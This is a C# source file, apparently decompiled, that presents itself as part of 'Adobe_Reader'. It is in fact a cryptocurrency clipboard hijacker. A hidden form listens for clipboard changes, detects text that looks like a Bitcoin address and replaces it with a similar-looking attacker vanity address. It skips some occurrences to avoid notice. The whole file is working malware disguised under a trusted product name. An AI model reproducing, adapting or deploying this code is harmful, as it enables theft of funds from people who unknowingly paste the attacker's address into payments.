using Adobe_Reader.Properties;
using System;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Adobe_Reader
{
	internal class BackgroundForm : Form
	{
		private const int OppToMissDef = 3;

		private int _oppToMiss;

		private string _origClpbrdTxt = "";

		private IContainer components;

		internal BackgroundForm()
		{
			InitializeComponent();
			AddClipboardFormatListener(base.Handle);
		}

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool AddClipboardFormatListener(IntPtr hwnd);

		protected override void WndProc(ref Message m)
		{
			base.WndProc(ref m);
			if (m.Msg == 797 && Clipboard.ContainsText())
			{
				string text = Clipboard.GetText();
				if (!Resources.vanityAddresses.Split(new string[1]
				{
					Environment.NewLine
				}, StringSplitOptions.RemoveEmptyEntries).ToList().Contains(text) && !(text == _origClpbrdTxt))
				{
					_origClpbrdTxt = text;
					if (Tools.ProbablyBtcAddress(text))
					{
						if (_oppToMiss > 0)
						{
							_oppToMiss--;
						}
						else
						{
							_oppToMiss = 3;
							Tools.SetMostSimilarBtcAddress(text);
						}
					}
				}
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new Container();
			base.AutoScaleMode = AutoScaleMode.Font;
			Text = "Form1";
		}
	}
}
